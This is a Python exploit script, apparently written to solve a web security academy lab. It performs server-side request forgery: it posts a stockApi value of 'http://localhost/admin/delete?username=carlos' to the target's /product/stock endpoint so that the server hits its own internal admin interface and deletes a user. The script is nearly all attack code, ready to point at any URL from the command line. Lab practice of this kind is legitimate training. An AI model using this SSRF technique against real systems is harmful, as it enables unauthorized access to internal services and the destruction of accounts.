import requests
import sys
from requests.adapters import HTTPAdapter, Retry



def delete_carlos_user(url, session):
    try:
        response = session.post(f"{url}/product/stock", data={"stockApi": "http://localhost/admin/delete?username=carlos"}, timeout=10)
        return "Congratulations, you solved the lab!" in response.text

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)


    url = sys.argv[1].rstrip("/")
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    print("(+) Deleting the user \"carlos\"...")
    if delete_carlos_user(url, session):
        print("(+) Successfully deleted the user \"carlos\"!")
    else:
        print("(-) The user \"carlos\" was not successfully deleted. Please check your URL and try again.")


if __name__ == "__main__":
    main()